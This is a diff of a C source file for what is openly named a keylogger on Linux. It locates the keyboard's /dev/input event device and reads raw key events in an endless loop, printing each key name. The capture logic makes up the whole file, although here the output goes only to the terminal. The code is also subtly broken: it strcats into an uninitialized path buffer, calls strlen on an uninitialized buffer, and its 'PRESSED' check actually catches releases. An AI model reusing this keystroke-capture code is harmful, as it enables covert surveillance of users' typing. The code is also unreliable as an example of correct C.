@@ -1,12 +1,12 @@
-#include "keylogger.h"
+
 #include <stdio.h>
 #include <fcntl.h>
 #include <linux/input.h>
 #include <unistd.h>
-#include <signal.h>
+//#include <signal.h>
 #include <stdlib.h>
 #include <string.h>
-
+#include "keylogger.h"
 char get_event_num(){
 
     const char *key_word = "keyboard";
@@ -52,48 +52,36 @@ int capture_keys(char *event_num){
     
 
     char event_final_path[BUFF_LINE];
-    
+    struct input_event ev;
+    char buffer[BUFF_LINE];
+    int fd;
+
     strcat(event_final_path, EVENT_PATH);
     strcat(event_final_path, event_num);
-    struct input_event ev;
-    printf("%s", event_final_path);
-
-    int fp = open((const char *)event_final_path, O_RDONLY);
-    int size = sizeof (struct input_event);
-
-    //signal(SIGINT, sa_handler);
-
-while (1){
-    read(fp, &ev, size);
-        if(ev.type == 1 && ev.value == 1){
-            printf("Key: %i State: %i\n",ev.code,ev.value);
-        }
-    sleep(1);
-}
-
-
-
-
-
-
-
-
-    /*
-    fp =  fopen(event_final_path, "rb");
-
-    if(fp == NULL){
-        printf("errrr");
+    
+    fd = open(event_final_path,O_RDONLY);
+    
+    if(fd == -1){
+        fprintf(stderr, "error while opening the file %d", fd);
         return -1;
     }
 
-        while(1){
-            fgets((void *) &ev, sizeof(struct input_event), fp);
-printf("2");
-            if(ev.type == 1)
-                printf("key %i state %i\n", ev.code, ev.value);
-printf("3");
+    
+    while(1){
+        read(fd, &ev, sizeof(struct input_event));
+        if(ev.type == 1){
+            if(ev.value != 1){ // PRESSED
+                printf("key pressed: %s \n", keycodes[ev.code]);
+                //strcat(buffer, keycodes[ev.code]);
+
+                if(strlen(buffer) == BUFF_LINE-1){
+                    printf("needs to clean buffer!");
+                    memset(buffer,0,BUFF_LINE);
+    
+                }
+            }
+
         }
-        
-*/
-        return 0;
+    }
+    return 0;
 }
